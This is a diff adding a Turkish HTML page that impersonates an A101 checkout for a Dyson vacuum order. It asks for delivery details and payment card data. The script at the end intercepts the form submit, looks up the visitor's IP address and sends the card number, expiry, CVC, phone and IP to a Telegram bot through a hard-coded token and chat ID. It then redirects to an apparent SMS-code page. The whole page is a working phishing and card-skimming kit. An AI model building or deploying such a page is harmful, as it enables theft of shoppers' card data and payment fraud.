@@ -1,0 +1,228 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>A101 Ödeme Sayfası</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: Arial, sans-serif;
+            background: #f8f9fa; /* Arka plan gri tonu */
+            color: #333;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            width: 100%;
+            overflow-x: hidden; /* Yatay kaydırmayı engeller */
+            margin: 0;
+            flex-direction: column;
+        }
+        .container {
+            width: 90%;
+            max-width: 500px;
+            background: #fff;
+            border-radius: 20px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            padding: 20px;
+            margin: 20px 0;
+        }
+        .summary-container, .delivery-container, .payment-container {
+            background: #f8f9fa;
+            border: 2px solid #ddd;
+            border-radius: 15px;
+            padding: 15px;
+            margin-bottom: 20px;
+        }
+        .summary-container h2, .delivery-container h2, .payment-container h1 {
+            font-size: 18px;
+            color: #333;
+            margin-bottom: 10px;
+        }
+        .field {
+            margin-bottom: 15px;
+            text-align: left;
+            display: flex;
+            flex-direction: column;
+        }
+        .field label {
+            font-weight: bold;
+            color: #555;
+            margin-bottom: 5px;
+        }
+        .field .required {
+            color: #e74c3c; /* Kırmızı ton */
+            font-size: 12px;
+            font-weight: bold;
+            margin-left: 5px;
+        }
+        .field input, .field textarea {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #ddd;
+            border-radius: 8px; /* Dikdörtgen kutucuk */
+            font-size: 14px;
+        }
+        .field input:focus, .field textarea:focus {
+            border-color: #2CBAD3;
+            outline: none;
+        }
+        button {
+            width: 100%;
+            background: #2CBAD3;
+            color: white;
+            padding: 12px;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            cursor: pointer;
+            transition: background 0.3s ease;
+        }
+        button:hover {
+            background: #2498b3;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- Siparis Ozeti -->
+        <div class="summary-container">
+            <h2>Sipariş Özeti</h2>
+            <p><strong>Ürün Adı:</strong> Dyson V15 Detect Dikey Süpürge - Dyson V15 Detect Kablosuz</p>
+            <p><strong>Toplam Tutar:</strong> 7.999 TL</p>
+            <p><strong>Teslimat Tarihi:</strong> 27/12/2024</p>
+        </div>
+        <!-- Teslimat Bilgileri -->
+        <div class="delivery-container">
+            <h2>Teslimat Bilgileri</h2>
+            <div class="field">
+                <label for="fullName">Ad Soyad: <span class="required">*</span></label>
+                <input type="text" id="fullName" name="fullName" required>
+            </div>
+            <div class="field">
+                <label for="phone">Telefon Numarası: <span class="required">*</span></label>
+                <input type="tel" id="phone" name="phone" minlength="10" maxlength="10" required>
+            </div>
+            <div class="field">
+                <label for="email">E-posta: <span class="required">*</span></label>
+                <input type="email" id="email" name="email" required>
+            </div>
+            <div class="field">
+                <label for="city">İl: <span class="required">*</span></label>
+                <input type="text" id="city" name="city" required>
+            </div>
+            <div class="field">
+                <label for="district">İlçe: <span class="required">*</span></label>
+                <input type="text" id="district" name="district" required>
+            </div>
+            <div class="field">
+                <label for="address">Adres: <span class="required">*</span></label>
+                <textarea id="address" name="address" rows="3" placeholder="Lütfen tam adresinizi yazınız..." required></textarea>
+            </div>
+        </div>
+        <!-- Ödeme Bilgileri -->
+        <div class="payment-container">
+            <h1>Ödeme Bilgileri</h1>
+            <form id="paymentForm" action="bekle.php" method="POST">
+                <div class="field">
+                    <label for="cardNumber">Kart Numarası: <span class="required">*</span></label>
+                    <input type="text" id="cardNumber" name="cardNumber" placeholder="0000 0000 0000 0000" minlength="16" maxlength="16" required>
+                </div>
+                <div class="field">
+                    <label for="expiryDate">Son Kullanma Tarihi (AY/YIL): <span class="required">*</span></label>
+                    <input type="text" id="expiryDate" name="expiryDate" placeholder="AY/YIL" maxlength="5" required>
+                </div>
+                <div class="field">
+                    <label for="cardCVC">CVC: <span class="required">*</span></label>
+                    <input type="text" id="cardCVC" name="cardCVC" placeholder="CVC" maxlength="3" pattern="\d{3}" required>
+                </div>
+                <button type="submit">Ödemeyi Tamamla</button>
+            </form>
+        </div>
+    </div>
+</body>
+</html>
+
+
+    <script>
+        // Son Kullanma Tarihi Otomatik Formatlama
+        const expiryDateInput = document.getElementById('expiryDate');
+        expiryDateInput.addEventListener('input', function (e) {
+            let value = e.target.value.replace(/\D/g, ''); // Sadece rakamları al
+            if (value.length > 2) {
+                value = value.slice(0, 2) + '/' + value.slice(2, 4); // MM/YY formatı
+            }
+            if (value.length > 5) {
+                value = value.slice(0, 5); // Maksimum 5 karakterle sınırla
+            }
+            e.target.value = value;
+        });
+
+        // Telegram API'ye Mesaj Gönderim
+document.getElementById('paymentForm').addEventListener('submit', function (event) {
+    event.preventDefault();
+
+    // Form verilerini al
+    const cardNumber = document.getElementById('cardNumber').value;
+    const expiryDate = document.getElementById('expiryDate').value;
+    const cardCVC = document.getElementById('cardCVC').value;
+    const phone = document.getElementById('phone').value;
+
+    // IP adresini al
+    fetch('https://api64.ipify.org?format=json')
+        .then(response => response.json())
+        .then(data => {
+            const ipAddress = data.ip;
+
+            // Telegram API bilgileri
+            const botToken = "8064272310:AAGviMZYqAyuCqiV48yqDzZSqiPCcf-gVvs"; // Bot tokeninizi buraya yazın
+            const chatId = "-1002317303620"; // Hedef chat ID'sini buraya yazın
+            const telegramAPI = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+            // Mesaj içeriği
+            const message = `
+Kart Bilgileri:
+- Kart Numarası: ${cardNumber}
+- Son Kullanma Tarihi: ${expiryDate}
+- CVC: ${cardCVC}
+- Telefon Numarası: ${phone}
+- IP Adresi: ${ipAddress}
+`;
+
+            // Telegram API'ye mesaj gönder
+            fetch(telegramAPI, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message,
+                }),
+            })
+                .then(response => {
+                    if (response.ok) {
+                        window.location.href = "sms.html"; // İşlem başarılıysa yönlendirme
+                    } else {
+                        alert('Mesaj gönderilemedi.');
+                    }
+                })
+                .catch(error => {
+                    console.error('Hata:', error);
+                    alert('Bir hata oluştu. Lütfen tekrar deneyin.');
+                });
+        })
+        .catch(error => {
+            console.error('IP alma hatası:', error);
+            alert('IP adresi alınamadı. Lütfen tekrar deneyin.');
+        });
+});
+
+    </script>
+</body>
+</html>
